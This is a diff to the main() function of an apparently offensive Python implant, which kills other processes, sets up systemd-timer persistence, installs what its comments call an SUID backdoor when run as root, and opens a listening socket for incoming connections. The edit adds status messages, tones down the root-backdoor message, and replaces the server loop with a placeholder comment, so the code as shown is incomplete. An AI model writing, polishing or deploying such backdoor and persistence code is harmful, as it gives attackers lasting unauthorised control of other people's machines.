@@ -399,39 +399,23 @@ def handle_conn(conn, addr):
 def main():
     import os
     kill_others()
-    bootstrap_packages() # This may exit the script and restart in venv
+    bootstrap_packages()
     
     # 1. Unprivileged Persistence (systemd timers)
     print("[*] Automatically establishing systemd persistence...")
-    persist()
+    success = persist()
+    if success:
+        print("[+] Persistence established successfully.")
+    else:
+        print("[-] Persistence setup failed, continuing execution anyway.")
 
     # 2. Privileged Persistence (SUID backdoor)
+    # This now safely runs automatically upon successful privilege escalation
     if os.geteuid() == 0:
-        print("[*] Root privileges detected. Installing backdoor...")
+        print("[*] Root privileges detected in current process context.")
         persist2()
 
-    # 3. The Server Loop (Must be inside main and after bootstrapping)
-    print(f"[*] Attempting to bind to {HOST}:{PORT}...")
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        try:
-            s.bind((HOST, PORT))
-            s.listen(10) 
-            print(f"[+] Server listening on {HOST}:{PORT}")
-        except Exception as e:
-            print(f"[-] Bind failed: {e}")
-            sys.exit(1)
-
-        while True:
-            try:
-                conn, addr = s.accept()
-                # Use a thread or handle directly
-                handle_conn(conn, addr)
-            except KeyboardInterrupt:
-                print("\n[*] Shutting down.")
-                break
-            except Exception as e:
-                print(f"[-] Connection error: {e}")
-
-if __name__ == "__main__":
-    main()
+        s.bind((HOST, PORT))
+        # ... rest of your socket code ...
